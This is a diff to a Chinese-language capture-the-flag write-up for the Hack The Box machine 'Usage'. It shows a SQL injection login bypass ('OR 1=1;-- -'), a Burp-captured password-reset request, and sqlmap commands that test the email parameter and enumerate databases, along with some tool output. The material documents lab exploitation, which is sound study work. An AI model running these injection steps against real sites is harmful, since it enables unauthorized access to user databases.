@@ -48,7 +48,7 @@ SELECT * FROM users WHERE username = 'test' AND password = '123';
 SELECT * FROM users WHERE username = 'test' OR 1=1;-- -' AND password = '123';
 ```
 #### 因为 OR 1=1 永远为真，这样可能导致数据库返回所有用户的信息。
-### burpsuite本地拦截正确的邮箱，这很重要！
+### burpsuite本地拦截login的登录，这很重要！
 ```
 POST /forget-password HTTP/1.1
 Host: usage.htb
@@ -69,11 +69,12 @@ Priority: u=0, i
 
 _token=COBOwWaz4f0a8vbIrzlLl8uhRM71Cknno2xg2PsF&email=syareya%40usage.htb
 ```
+#### Connection: keep-alive把它改成close,结尾的email=test
 #### 我们复制POST请求并将其保存在一个名为reset.req，我们现在可以将其提供给sqlmap
 #### 在burpsuite复制的按键Ctrl+C
 #### 粘贴到vi里面的按键Shift+Ctrl+V
 ```
-[★]$ sqlmap -r reset.req email --batch
+[★]$ sqlmap -r reset.req -p email --batch
         ___
        __H__
  ___ ___[.]_____ ___ ___  {1.8.12#stable}
@@ -103,34 +104,15 @@ it is recommended to perform only basic UNION tests if there is not at least one
 |___|_  [,]_|_|_|__,|  _|
       |_|V...       |_|   https://sqlmap.org
 
-[11:18:46] [INFO] testing for SQL injection on POST parameter 'email'
-[11:18:47] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
-[11:18:49] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
-[11:18:49] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
-[11:18:50] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
-[11:18:51] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
-[11:18:51] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
-[11:18:53] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
-[11:18:54] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
-[11:18:55] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
-[11:18:56] [INFO] testing 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
-[11:18:58] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
-[11:18:58] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
-[11:18:58] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace'
-[11:18:58] [INFO] testing 'Oracle boolean-based blind - Parameter replace'
-[11:18:58] [INFO] testing 'Informix boolean-based blind - Parameter replace'
-[11:18:58] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace'
-[11:18:58] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
-[11:18:58] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
-[11:18:58] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
-[11:18:58] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
-[11:18:58] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
-[11:18:58] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
-[11:18:59] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
-[11:18:59] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
+<SNIP>
+[02:51:02] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql')
 <SNIP>
 ```
 #### 使用——level 3，该工具发现服务器容易受到基于布尔的盲注入的攻击，以及攻击基于时间的盲注入。我们了解到后端正在运行MySQL，现在可以继续列举数据库和表。
 #### 使用——dbs标志获得可用数据库的列表：
+```
+[★]$ sqlmap -r reset.req -p email --batch --level 3 --dbs
 
+[02:54:57] [WARNING] if UNION based SQL injection is not detected, please consider and/or try to force the back-end DBMS (e.g. '--dbms=mysql') 
+```
 #### 看到一个非默认数据库，即usage_blog。我们继续枚举它的表，使用——tables标志:
